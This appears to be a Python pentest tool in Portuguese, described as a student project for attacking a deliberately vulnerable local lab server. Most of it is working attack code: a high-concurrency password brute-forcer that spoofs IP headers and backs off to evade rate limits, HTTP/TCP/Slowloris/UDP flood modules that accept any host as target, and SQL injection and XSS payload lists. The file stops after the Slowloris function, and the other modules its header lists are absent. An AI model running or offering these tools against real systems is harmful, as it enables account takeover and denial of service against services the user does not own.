#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
netlab_pentest.py — Ferramenta de Demonstração de Pentest Educacional
═══════════════════════════════════════════════════════════════════════
Explora controladamente todas as vulnerabilidades do servidor de
laboratório do NetLab Educacional (painel_servidor.py).

Vulnerabilidades cobertas
─────────────────────────
  [1]  Força Bruta Assíncrona       — dicionário numérico contra /login
  [2]  Teste de Estresse / DoS       — HTTP flood / TCP / Slowloris / UDP
  [3]  Scanner de Endpoints          — enumera rotas + analisa headers
  [4]  Interceptação HTTP            — mostra dados em texto puro
  [5]  SQL Injection                 — bypass de login + UNION dump de users
  [6]  XSS Exploit                   — refletido (/busca, /perfil) + armazenado (/comentarios)
  [7]  IDOR Exploit                  — acessa pedidos alheios sem autenticação
  [8]  Session Hijack                — enumera tokens previsíveis (token1, token2...)
  [9]  CSRF PoC                      — gera HTML que posta comentário sem consentimento
  [10] Auto-Pwn (Encadeamento)       — SQLi → credenciais → IDOR → XSS armazenado

Dependências
────────────
  pip install aiohttp requests rich

Aviso ético
───────────
  Use exclusivamente contra o servidor NetLab local (localhost / LAN).
  Nunca direcione esta ferramenta a sistemas sem autorização explícita.

Autor  : Yuri Gonçalves Pavão
TCC    : Técnico em Informática — IFFar Campus Uruguaiana
Versão : 5.0  (reescrita completa — sem erros de funcionamento)
"""

from __future__ import annotations

import asyncio
import calendar
import os
import random
import re
import socket
import ssl
import sys
import time
import threading
from abc         import ABC, abstractmethod
from typing      import Dict, Iterator, List, Optional, Tuple

# ── Dependências opcionais ────────────────────────────────────────────────────

try:
    import aiohttp
    _AIOHTTP_OK = True
except ImportError:
    _AIOHTTP_OK = False

try:
    import requests as _req
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

try:
    from rich.console  import Console
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                               TaskProgressColumn, MofNCompleteColumn,
                               TimeElapsedColumn, TimeRemainingColumn)
    from rich.table    import Table
    from rich.panel    import Panel
    from rich.text     import Text
    from rich          import box as rich_box
    _RICH_OK = True
    console  = Console()
except ImportError:
    _RICH_OK = False
    console  = None  # type: ignore[assignment]


# ══════════════════════════════════════════════════════════════════════════════
# Cores ANSI e utilitários de saída
# ══════════════════════════════════════════════════════════════════════════════

_VERDE   = "\033[92m"
_VERM    = "\033[91m"
_AMAR    = "\033[93m"
_CIANO   = "\033[96m"
_MAG     = "\033[95m"
_RESET   = "\033[0m"
_BOLD    = "\033[1m"
_DIM     = "\033[2m"


def _cor_print(cor: str, msg: str) -> None:
    if _RICH_OK and console:
        mapa = {_VERDE: "green", _VERM: "red", _AMAR: "yellow",
                _CIANO: "cyan", _MAG: "magenta"}
        tag = mapa.get(cor, "white")
        console.print(f"[{tag}]{msg}[/{tag}]")
    else:
        print(f"{cor}{msg}{_RESET}")


def ok(msg: str)       -> None: _cor_print(_VERDE, f"  [✓] {msg}")
def erro(msg: str)     -> None: _cor_print(_VERM,  f"  [✗] {msg}")
def aviso(msg: str)    -> None: _cor_print(_AMAR,  f"  [!] {msg}")
def info(msg: str)     -> None: _cor_print(_CIANO, f"  [·] {msg}")
def destaque(msg: str) -> None: _cor_print(_MAG,   msg)


def limpar_tela() -> None:
    os.system("cls" if os.name == "nt" else "clear")


def entrada(prompt: str, padrao: Optional[str] = None,
            obrigatorio: bool = False) -> str:
    """Lê entrada do usuário com valor padrão opcional."""
    marca = f" [{padrao}]" if padrao is not None else ""
    try:
        valor = input(f"\n  {_CIANO}{prompt}{_RESET}{marca}: ").strip()
    except (EOFError, KeyboardInterrupt):
        return padrao or ""
    if not valor and padrao is not None:
        return padrao
    if obrigatorio and not valor:
        erro("Campo obrigatório.")
        return entrada(prompt, padrao, obrigatorio)
    return valor


def tabela_rich(linhas: List[List[str]], cabecalho: List[str],
                titulo: str = "") -> None:
    """Exibe tabela formatada — usa Rich quando disponível."""
    if _RICH_OK and console:
        t = Table(title=titulo, box=rich_box.ROUNDED,
                  border_style="cyan", header_style="bold cyan")
        for col in cabecalho:
            t.add_column(col)
        for row in linhas:
            t.add_row(*[str(c) for c in row])
        console.print(t)
    else:
        print(f"\n{_BOLD}{titulo}{_RESET}")
        print("  " + "  |  ".join(cabecalho))
        print("  " + "-" * 60)
        for row in linhas:
            print("  " + "  |  ".join(str(c) for c in row))
        print()


def banner() -> None:
    versao = "5.0"
    if _RICH_OK and console:
        t = Text()
        t.append("  NetLab Pentest ", style="bold cyan")
        t.append(f"v{versao}", style="bold magenta")
        t.append("  —  Demonstração de Segurança Educacional", style="dim cyan")
        console.print(Panel(t, border_style="cyan", padding=(0, 2)))
        libs = []
        libs.append("[green]aiohttp ✓[/green]"  if _AIOHTTP_OK  else "[red]aiohttp ✗[/red]")
        libs.append("[green]requests ✓[/green]" if _REQUESTS_OK else "[red]requests ✗[/red]")
        libs.append("[green]rich ✓[/green]"     if _RICH_OK     else "[red]rich ✗[/red]")
        console.print("  Dependências: " + "  ".join(libs))
        console.print(
            "  [dim]Alvo padrão: [bold]http://localhost:8080[/bold] "
            "(servidor NetLab local)[/dim]\n"
        )
    else:
        print(f"""
{_CIANO}{_BOLD}
╔══════════════════════════════════════════════════════════════════╗
║   NetLab Pentest v{versao}  —  Demonstração de Segurança Educacional ║
║   TCC · Técnico em Informática · IFFar Campus Uruguaiana        ║
╚══════════════════════════════════════════════════════════════════╝
{_RESET}""")
        print(f"  aiohttp: {'✓' if _AIOHTTP_OK else '✗'}   "
              f"requests: {'✓' if _REQUESTS_OK else '✗'}   "
              f"rich: {'✓' if _RICH_OK else '✗'}\n")


# ══════════════════════════════════════════════════════════════════════════════
# Constantes, wordlists e payloads
# ══════════════════════════════════════════════════════════════════════════════

_MAX_BF_CONCORRENCIA     = 512
_MAX_STRESS_CONCORRENCIA = 1500
_TIMEOUT_PADRAO          = 3.0
_LOTE_STRESS             = 400

# ── Palavras-chave para detectar resultado de login ───────────────────────────
# O servidor NetLab redireciona para / após login bem-sucedido e mantém o
# usuário em sessão. Nas páginas autenticadas aparece "Sessão ativa" no HTML.
# Em falha, aparece "incorretos" ou "erro" na página de login.
_KW_FALHA = frozenset({
    "incorretos", "incorreto", "inválido", "inválidos",
    "usuario ou senha", "usuário ou senha",
    "senha errada", "invalid", "incorrect", "wrong",
    "failed", "denied", "error", "erro",
})
_KW_SUCESSO = frozenset({
    "sessão ativa", "sessao ativa", "encerrar sessão", "encerrar sessao",
    "sair", "logout", "dashboard", "bem-vindo", "welcome",
    "iniciada como", "logado", "sessão iniciada",
})

_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
    "AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
)

# Senhas numéricas — o servidor NetLab aceita apenas dígitos no registro
_SENHAS_COMUNS: List[str] = [
    "123456", "654321", "111111", "000000", "123123", "112233",
    "12345678", "87654321", "11223344", "44332211", "10203040", "20304050",
    "12344321", "11111111", "22222222", "33333333", "44444444", "55555555",
    "66666666", "77777777", "88888888", "99999999", "00000000",
    "102030",  "121314",  "147258",  "159357",  "123654",  "321654",
    "456123",  "789456",  "753951",  "147852",  "258369",  "369258",
    "741852",  "852963",  "963741",
    "1234", "4321", "9999", "1111", "0000", "0001", "1000",
    "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007",
    "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015",
    "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023",
    "2024", "2025", "2026",
    "1970", "1980", "1985", "1990", "1995",
    "010203", "030201", "112358", "314159",
    "12344321", "43211234", "192837", "564738", "102938",
    "1234567890", "9876543210", "1234567", "7654321",
]

# Payloads SQLi para bypass de login
_SQLI_BYPASS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin' --",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "') OR ('1'='1",
    "' UNION SELECT 1,1,1 --",
]

# Payloads XSS
_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')>",
]

# Endpoints para scanner
_ENDPOINTS = [
    "/", "/login", "/register", "/logout",
    "/produtos", "/busca", "/comentarios", "/pedidos",
    "/perfil", "/usuarios", "/api/dados", "/api/usuarios",
    "/admin", "/config", "/backup", "/.env",
    "/robots.txt", "/sitemap.xml",
    "/api", "/api/v1", "/api/users", "/status", "/health",
]


# ══════════════════════════════════════════════════════════════════════════════
# Geradores de wordlist
# ══════════════════════════════════════════════════════════════════════════════

def gerar_intervalo(ini: int, fim: int) -> List[str]:
    return [str(i) for i in range(ini, fim + 1)]


def gerar_por_comprimento(tamanhos: List[int]) -> List[str]:
    resultado = []
    for t in tamanhos:
        ini = 10 ** (t - 1) if t > 1 else 0
        fim = 10 ** t - 1
        resultado.extend(str(i) for i in range(ini, fim + 1))
    return resultado


def gerar_datas(ano_ini: int, ano_fim: int, fmt: str) -> List[str]:
    formatos: Dict = {
        "DDMMAAAA": lambda d, m, a: f"{d:02d}{m:02d}{a:04d}",
        "DDMMAA":   lambda d, m, a: f"{d:02d}{m:02d}{a % 100:02d}",
        "MMDDAAAA": lambda d, m, a: f"{m:02d}{d:02d}{a:04d}",
        "AAAAMMDD": lambda d, m, a: f"{a:04d}{m:02d}{d:02d}",
        "AAMMDD":   lambda d, m, a: f"{a % 100:02d}{m:02d}{d:02d}",
    }
    fn = formatos.get(fmt)
    if not fn:
        raise ValueError(f"Formato desconhecido: {fmt}")
    resultado = []
    for ano in range(ano_ini, ano_fim + 1):
        for mes in range(1, 13):
            for dia in range(1, calendar.monthrange(ano, mes)[1] + 1):
                resultado.append(fn(dia, mes, ano))
    return resultado


def carregar_wordlist(caminho: str) -> Optional[List[str]]:
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            palavras = [l.strip() for l in f if l.strip()]
        if not palavras:
            erro("Wordlist vazia.")
            return None
        ok(f"{len(palavras):,} senhas carregadas de '{caminho}'.")
        return palavras
    except FileNotFoundError:
        erro(f"Arquivo não encontrado: {caminho}")
        return None
    except Exception as e:
        erro(f"Erro ao ler wordlist: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# Helpers de rede e detecção
# ══════════════════════════════════════════════════════════════════════════════

def _ip_falso() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _ua() -> str:
    return random.choice(_USER_AGENTS)


def _headers_extras() -> dict:
    return {
        "User-Agent":      _ua(),
        "X-Forwarded-For": _ip_falso(),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    }


def _login_bem_sucedido(status: int, corpo: str, location: str) -> bool:
    """
    Detecta login bem-sucedido no servidor NetLab.

    O servidor NetLab retorna HTTP 200 com o HTML da página inicial
    quando o login é aceito. A página inicial autenticada contém o
    texto 'Sessão ativa' ou 'encerrar sessão' no HTML.
    Em falha, retorna HTTP 200 mas com 'incorretos' no corpo.
    """
    # Redirect explícito para fora do /login é sucesso inequívoco
    if status in (301, 302, 303, 307, 308):
        if location and "/login" not in location.lower():
            return True

    if status == 200:
        corpo_lower = corpo.lower()
        # Qualquer indicador positivo de sessão autenticada
        if any(k in corpo_lower for k in _KW_SUCESSO):
            return True
        # Nenhum indicador de falha E nenhuma palavra de login presente
        # (evita falso positivo na própria página de login vazia)
        sem_falha = not any(k in corpo_lower for k in _KW_FALHA)
        sem_login_form = "type=\"password\"" not in corpo_lower
        if sem_falha and sem_login_form:
            return True

    return False


def _detecta_bloqueio(status: int, corpo: str) -> bool:
    return status == 429 or (
        status in (403, 503)
        and any(w in corpo.lower() for w in ("bloqueado", "blocked", "captcha", "rate"))
    )


def testar_conectividade(url: str) -> bool:
    if not _REQUESTS_OK:
        aviso("requests ausente — pulando teste de conectividade.")
        return True
    try:
        r = _req.get(url, timeout=5, allow_redirects=False)
        ok(f"Servidor acessível — HTTP {r.status_code}")
        return True
    except Exception as e:
        aviso(f"Servidor inacessível ({e}). Verifique se está no ar.")
        return False


# ══════════════════════════════════════════════════════════════════════════════
# Exceção interna para interromper força bruta
# ══════════════════════════════════════════════════════════════════════════════

class _SenhaAchada(Exception):
    def __init__(self, senha: str):
        self.senha = senha


# ══════════════════════════════════════════════════════════════════════════════
# Classe base para módulos de ataque
# ══════════════════════════════════════════════════════════════════════════════

class BaseAtaque(ABC):

    def __init__(self) -> None:
        self._tentativas: int   = 0
        self._erros:      int   = 0
        self._recusados:  int   = 0
        self._inicio:  Optional[float] = None
        self._fim:     Optional[float] = None

    @abstractmethod
    def configurar(self) -> None: ...

    @abstractmethod
    def executar(self) -> None: ...

    @abstractmethod
    def mostrar_resultado(self) -> None: ...

    def executar_interativo(self) -> None:
        self.configurar()
        if not self._confirmar():
            aviso("Cancelado pelo usuário.")
            return
        self._inicio = time.monotonic()
        try:
            self.executar()
        except KeyboardInterrupt:
            aviso("Interrompido pelo usuário.")
        self._fim = time.monotonic()
        self.mostrar_resultado()

    def _confirmar(self) -> bool:
        return entrada("Iniciar? (s/N)", "n").lower().startswith("s")

    @property
    def _decorrido(self) -> float:
        i = self._inicio or time.monotonic()
        f = self._fim    or time.monotonic()
        return max(f - i, 1e-9)


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 1 — Força Bruta Assíncrona
# ══════════════════════════════════════════════════════════════════════════════

class ModuloBruteForce(BaseAtaque):
    """Força bruta assíncrona (aiohttp) ou síncrona (requests) contra /login."""

    def __init__(self) -> None:
        super().__init__()
        self._url_login:    str           = ""
        self._usuario:      str           = "admin"
        self._senhas:       List[str]     = []
        self._concorrencia: int           = 80
        self._delay:        float         = 0.0
        self._timeout:      float         = 3.0
        self._proxy:        Optional[str] = None
        self._resultado:    Optional[str] = None
        self._waf:          bool          = False

    # ── Configuração ──────────────────────────────────────────────────────────

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Força Bruta ──{_RESET}")

        url_base = entrada("URL base do servidor", "http://localhost:8080")
        if not url_base.startswith("http"):
            url_base = "http://" + url_base
        url_base = url_base.rstrip("/")
        self._url_login = url_base + "/login"
        testar_conectividade(url_base)

        self._usuario = entrada("Usuário alvo", "admin", obrigatorio=True)
        ok(f"Alvo: {self._usuario} em {self._url_login}")

        self._senhas = self._menu_wordlist()

        if entrada("Tentar bypass SQLi antes do dicionário? (s/N)", "n").lower().startswith("s"):
            sqli_extras = [
                "' OR '1'='1", "' OR 1=1 --", "admin' --",
                "' OR '1'='1' --", "') OR ('1'='1",
            ]
            self._senhas = sqli_extras + self._senhas
            ok(f"{len(sqli_extras)} payloads de bypass adicionados ao início.")

        self._concorrencia = max(1, min(
            int(entrada(f"Coroutines simultâneas (1–{_MAX_BF_CONCORRENCIA})", "80")),
            _MAX_BF_CONCORRENCIA,
        ))
        self._delay   = float(entrada("Delay entre req (s)", "0.0"))
        self._timeout = max(0.1, float(entrada("Timeout por req (s)", "2.5")))
        proxy = entrada("Proxy HTTP (vazio = nenhum)", "")
        self._proxy = proxy if proxy else None

        tabela_rich([
            ["URL Login",       self._url_login],
            ["Usuário",         self._usuario],
            ["Total de senhas", f"{len(self._senhas):,}"],
            ["Coroutines",      str(self._concorrencia)],
            ["Delay",           f"{self._delay}s"],
            ["Timeout",         f"{self._timeout}s"],
            ["Proxy",           self._proxy or "—"],
            ["Motor",           "asyncio + aiohttp" if _AIOHTTP_OK else "requests (sync)"],
        ], ["Parâmetro", "Valor"], "Resumo — Força Bruta")

    def _menu_wordlist(self) -> List[str]:
        print(f"""
  {_AMAR}Estratégia de senhas:{_RESET}
    1  — Senhas numéricas comuns ({len(_SENHAS_COMUNS)} entradas)
    2  — Intervalo numérico (ex: 0–9999)
    3  — Por comprimento (ex: todos os de 4 dígitos = 10 000 senhas)
    4  — Wordlist de arquivo
    5  — Datas formatadas (aniversários, anos)
    6  — Força bruta total por dígitos""")

        opcao = entrada("Escolha [1–6]", "1")

        if opcao == "1":
            aviso(f"{len(_SENHAS_COMUNS)} senhas comuns selecionadas.")
            return list(_SENHAS_COMUNS)

        if opcao == "2":
            ini = int(entrada("Valor inicial", "0"))
            fim = int(entrada("Valor final",   "9999"))
            lista = gerar_intervalo(ini, fim)
            aviso(f"{len(lista):,} senhas no intervalo.")
            return lista

        if opcao == "3":
            raw = entrada("Comprimentos (ex: 4 ou 4,6 ou 4-6)", "4")
            if "-" in raw:
                a, b = map(int, raw.split("-", 1))
                tamanhos = list(range(a, b + 1))
            elif "," in raw:
                tamanhos = [int(x.strip()) for x in raw.split(",")]
            else:
                tamanhos = [int(raw.strip())]
            total = sum(10**t - (10**(t-1) if t > 1 else 0) for t in tamanhos)
            aviso(f"≈ {total:,} senhas a testar.")
            if not entrada(f"Confirmar {total:,} senhas? (s/N)", "n").lower().startswith("s"):
                return self._menu_wordlist()
            return gerar_por_comprimento(tamanhos)

        if opcao == "4":
            caminho = entrada("Caminho do arquivo", obrigatorio=True)
            palavras = carregar_wordlist(caminho)
            if not palavras:
                return self._menu_wordlist()
            return palavras

        if opcao == "5":
            ano_ini = int(entrada("Ano inicial", "1980"))
            ano_fim = int(entrada("Ano final",   "2010"))
            print("""
    Formatos: DDMMAAAA  DDMMAA  MMDDAAAA  AAAAMMDD  AAMMDD""")
            fmt = entrada("Formato", "DDMMAAAA").upper()
            datas = gerar_datas(ano_ini, ano_fim, fmt)
            aviso(f"{len(datas):,} datas geradas ({fmt}).")
            return datas

        if opcao == "6":
            digitos = int(entrada("Quantidade de dígitos (4 = 0000–9999)", "4"))
            total   = 10 ** digitos
            aviso(f"Força bruta total: {total:,} senhas.")
            if not entrada(f"Confirmar {total:,} senhas? (s/N)", "n").lower().startswith("s"):
                return self._menu_wordlist()
            return gerar_intervalo(0, total - 1)

        aviso("Opção inválida — usando senhas comuns.")
        return list(_SENHAS_COMUNS)

    # ── Execução ──────────────────────────────────────────────────────────────

    def executar(self) -> None:
        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
        elif _REQUESTS_OK:
            aviso("aiohttp ausente — usando requests (modo síncrono).")
            self._sync_main()
        else:
            erro("Nenhuma lib HTTP disponível. Execute: pip install aiohttp requests")

    # ── Motor assíncrono (aiohttp) ────────────────────────────────────────────

    async def _async_main(self) -> None:
        senhas     = list(self._senhas)
        total      = len(senhas)
        encontrado = asyncio.Event()

        fila: asyncio.Queue = asyncio.Queue(
            maxsize=min(self._concorrencia * 8, 50_000)
        )

        async def produtor() -> None:
            for s in senhas:
                if encontrado.is_set():
                    break
                await fila.put(s)
            for _ in range(self._concorrencia):
                await fila.put(None)   # sentinels

        conector = aiohttp.TCPConnector(
            limit=self._concorrencia,
            limit_per_host=self._concorrencia,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False,
        )
        timeout_obj = aiohttp.ClientTimeout(
            total=self._timeout,
            connect=min(self._timeout, 2.0),
        )

        async with aiohttp.ClientSession(
            connector=conector,
            timeout=timeout_obj,
        ) as sessao:

            tarefa_prod = asyncio.create_task(produtor())

            # Barra de progresso Rich
            if _RICH_OK and console:
                prog = Progress(
                    SpinnerColumn(), "[cyan]BruteForce[/cyan]",
                    BarColumn(), TaskProgressColumn(),
                    MofNCompleteColumn(), TimeElapsedColumn(),
                    TimeRemainingColumn(), console=console, transient=True,
                )
                tid = prog.add_task("", total=total)
                prog.start()
            else:
                prog = tid = None

            workers = [
                asyncio.create_task(
                    self._worker(sessao, fila, encontrado, prog, tid)
                )
                for _ in range(self._concorrencia)
            ]

            tarefas = [tarefa_prod] + workers
            try:
                done, _ = await asyncio.wait(
                    tarefas,
                    return_when=asyncio.FIRST_EXCEPTION,
                )
                # Verifica se alguma task levantou _SenhaAchada
                for t in done:
                    exc = t.exception() if not t.cancelled() else None
                    if isinstance(exc, _SenhaAchada):
                        self._resultado = exc.senha
                        break
            except Exception:
                pass
            finally:
                for t in tarefas:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*tarefas, return_exceptions=True)

            if prog:
                prog.stop()

    async def _worker(self, sessao, fila: asyncio.Queue,
                      encontrado: asyncio.Event, prog, tid) -> None:
        backoff = 1.0

        while not encontrado.is_set():
            senha = await fila.get()
            if senha is None or encontrado.is_set():
                return

            status, corpo, loc = await self._post_login(sessao, senha)
            self._tentativas += 1

            if prog and tid is not None:
                prog.advance(tid)

            if _detecta_bloqueio(status, corpo):
                if not self._waf:
                    self._waf = True
                    aviso(f"Rate limiting detectado (HTTP {status}) — backoff...")
                jitter = random.uniform(0, backoff * 0.3)
                await asyncio.sleep(backoff + jitter)
                backoff = min(backoff * 2.0, 120.0)
                await fila.put(senha)
                continue

            backoff = max(1.0, backoff * 0.85)

            if status == 0:
                self._erros += 1
            elif _login_bem_sucedido(status, corpo, loc):
                encontrado.set()
                destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}\n")
                raise _SenhaAchada(senha)

            if self._delay > 0:
                await asyncio.sleep(self._delay)

            # Progresso sem Rich a cada 1000 tentativas
            if not _RICH_OK and self._tentativas % 1000 == 0:
                tps = self._tentativas / self._decorrido
                info(f"[{self._tentativas:,}/{len(self._senhas):,}] {tps:.0f} req/s")

    async def _post_login(self, sessao, senha: str) -> Tuple[int, str, str]:
        """Envia POST /login e retorna (status, corpo, location)."""
        try:
            async with sessao.post(
                self._url_login,
                data={"usuario": self._usuario, "senha": senha},
                proxy=self._proxy,
                allow_redirects=False,
                headers=_headers_extras(),
            ) as resp:
                corpo = await resp.text(errors="ignore")
                loc   = resp.headers.get("Location", "")
                return resp.status, corpo, loc
        except Exception:
            return 0, "", ""

    # ── Motor síncrono (requests) ─────────────────────────────────────────────

    def _sync_main(self) -> None:
        import queue
        import concurrent.futures

        fila: queue.Queue = queue.Queue(maxsize=self._concorrencia * 4)
        parar = threading.Event()

        def produtor():
            for s in self._senhas:
                if parar.is_set():
                    break
                fila.put(s)
            for _ in range(self._concorrencia):
                fila.put(None)

        threading.Thread(target=produtor, daemon=True).start()

        def worker():
            sess = _req.Session()
            while not parar.is_set():
                senha = fila.get()
                if senha is None:
                    return
                try:
                    r = sess.post(
                        self._url_login,
                        data={"usuario": self._usuario, "senha": senha},
                        timeout=self._timeout,
                        allow_redirects=False,
                        headers=_headers_extras(),
                    )
                    self._tentativas += 1
                    if _login_bem_sucedido(r.status_code, r.text,
                                           r.headers.get("Location", "")):
                        self._resultado = senha
                        parar.set()
                        destaque(f"\n\n  ✓ SENHA ENCONTRADA: {_BOLD}{senha}{_RESET}\n")
                        return
                except Exception:
                    self._erros += 1
                if self._delay > 0:
                    time.sleep(self._delay)

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self._concorrencia
        ) as ex:
            concurrent.futures.wait([ex.submit(worker) for _ in range(self._concorrencia)])

    # ── Resultado ─────────────────────────────────────────────────────────────

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / self._decorrido
        tabela_rich([
            ["Tentativas",     f"{self._tentativas:,}"],
            ["Erros/timeout",  f"{self._erros:,}"],
            ["Tempo total",    f"{self._decorrido:.2f}s"],
            ["Taxa média",     f"{tps:.1f} req/s"],
            ["WAF/rate limit", "Sim" if self._waf else "Não"],
        ], ["Métrica", "Valor"], "Resultado — Força Bruta")

        if self._resultado:
            print(f"\n  {_VERDE}{_BOLD}{'='*54}")
            print(f"  [✓] SUCESSO!  Usuário: {self._usuario}  |  Senha: {self._resultado}")
            print(f"  {'='*54}{_RESET}")
        else:
            erro("Nenhuma senha válida encontrada no espaço testado.")

        if self._waf:
            aviso("Rate limiting detectado durante o ataque.")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 2 — Teste de Estresse / DoS
# ══════════════════════════════════════════════════════════════════════════════

class ModuloEstresse(BaseAtaque):
    """HTTP flood / TCP flood / Slowloris / UDP flood."""

    _DURACAO_MAX = 300

    def __init__(self) -> None:
        super().__init__()
        self._ip:           str   = "127.0.0.1"
        self._porta:        int   = 8080
        self._host:         str   = "localhost"
        self._tipo:         str   = "http"
        self._concorrencia: int   = 200
        self._timeout:      float = 2.0
        self._duracao:      float = 30.0
        self._repeticoes:   int   = 20

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_BOLD}  ── Configuração: Teste de Estresse ──{_RESET}")
        print(f"""
  {_AMAR}Modos:{_RESET}
    http      — GET flood assíncrono
    tcp       — conexões TCP brutas
    slowloris — headers incompletos que travam threads
    udp       — datagramas UDP
""")
        alvo = entrada("IP ou hostname alvo", "localhost")
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", alvo):
            self._ip = alvo
        else:
            try:
                self._ip = socket.gethostbyname(alvo)
                ok(f"{alvo} → {self._ip}")
            except socket.gaierror:
                aviso(f"Não resolveu {alvo} — usando 127.0.0.1")
                self._ip = "127.0.0.1"
        self._host = alvo

        self._porta = int(entrada("Porta", "8080"))
        tipo = entrada("Tipo (http/tcp/slowloris/udp)", "http").lower()
        if tipo not in ("http", "tcp", "slowloris", "udp"):
            aviso("Tipo inválido — usando http.")
            tipo = "http"
        self._tipo = tipo

        self._concorrencia = max(1, min(
            int(entrada(f"Conexões simultâneas (máx {_MAX_STRESS_CONCORRENCIA})", "300")),
            _MAX_STRESS_CONCORRENCIA,
        ))
        self._timeout  = max(0.1, float(entrada("Timeout por conexão (s)", "3.0")))
        dur            = float(entrada(f"Duração total (s, máx {self._DURACAO_MAX})", "30"))
        self._duracao  = max(1, min(dur, self._DURACAO_MAX))
        self._repeticoes = max(1, int(entrada("Repetições por worker", "20")))

        tabela_rich([
            ["Alvo",       f"{self._ip}:{self._porta} ({self._host})"],
            ["Tipo",       self._tipo.upper()],
            ["Workers",    str(self._concorrencia)],
            ["Duração",    f"{self._duracao:.0f}s"],
            ["Repetições", str(self._repeticoes)],
            ["Timeout",    f"{self._timeout}s"],
        ], ["Parâmetro", "Valor"], "Resumo — Teste de Estresse")

    def executar(self) -> None:
        asyncio.run(self._async_main())

    async def _async_main(self) -> None:
        loop      = asyncio.get_event_loop()
        tempo_fim = loop.time() + self._duracao
        sem       = asyncio.Semaphore(self._concorrencia)

        info(f"\n  {self._tipo.upper()} → {self._ip}:{self._porta} "
             f"({self._concorrencia} workers · {self._duracao:.0f}s)")
        info("  Ctrl+C para interromper.\n")

        tarefa_stats = asyncio.create_task(self._stats_loop(tempo_fim))

        sock_udp: Optional[socket.socket] = None
        if self._tipo == "udp":
            sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        total_tarefas = self._concorrencia * self._repeticoes
        todas: list = []

        try:
            for i in range(0, total_tarefas, _LOTE_STRESS):
                if loop.time() >= tempo_fim:
                    break
                lote_n = min(_LOTE_STRESS, total_tarefas - i)
                lote = [
                    asyncio.create_task(self._despachar(sem, tempo_fim, sock_udp))
                    for _ in range(lote_n)
                ]
                todas.extend(lote)
                await asyncio.sleep(0)

            await asyncio.gather(*todas, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            aviso("\n  Interrompido.")
            for t in todas:
                t.cancel()
        finally:
            if sock_udp:
                sock_udp.close()
            tarefa_stats.cancel()
            sys.stdout.write("\n")
            sys.stdout.flush()

    async def _despachar(self, sem: asyncio.Semaphore,
                          tempo_fim: float,
                          sock_udp: Optional[socket.socket]) -> None:
        if asyncio.get_event_loop().time() >= tempo_fim:
            return
        async with sem:
            if asyncio.get_event_loop().time() >= tempo_fim:
                return
            try:
                if self._tipo == "tcp":
                    await self._tcp()
                elif self._tipo == "udp":
                    self._udp(sock_udp)
                elif self._tipo == "slowloris":
                    await self._slowloris()
                else:
                    await self._http_flood()
            except (ConnectionRefusedError, ConnectionResetError):
                self._recusados += 1
            except Exception:
                self._erros += 1

    async def _http_flood(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        req = (
            f"GET / HTTP/1.1\r\nHost: {self._host}\r\n"
            f"User-Agent: {_ua()}\r\n"
            f"X-Forwarded-For: {_ip_falso()}\r\n"
            "Accept: text/html\r\nConnection: close\r\n\r\n"
        ).encode("ascii")
        w.write(req)
        await w.drain()
        w.close()
        self._tentativas += 1

    async def _tcp(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        w.write(b"GET / HTTP/1.0\r\n\r\n")
        await w.drain()
        w.close()
        self._tentativas += 1

    def _udp(self, sock: Optional[socket.socket]) -> None:
        s = sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(os.urandom(1024), (self._ip, self._porta))
        self._tentativas += 1

    async def _slowloris(self) -> None:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        # Header proposital incompleto (sem \r\n\r\n final)
        w.write((
            f"GET / HTTP/1.1\r\n"
            f"Host: {self._host}\r\n"
            f"User-Agent: {_ua()}\r\n"
            f"X-Forwarded-For: {_ip_falso()}\r\n"
            "Accept-Language: pt-BR,pt;q=0.9\r\n"
        ).encode())
        await w.drain()
        for _ in range(8):
            w.write(f"X-Keep: {random.randint(1, 9999)}\r\n".encode())
            await w.drain()
            await asyncio.sleep(random.uniform(0.4, 1.2))
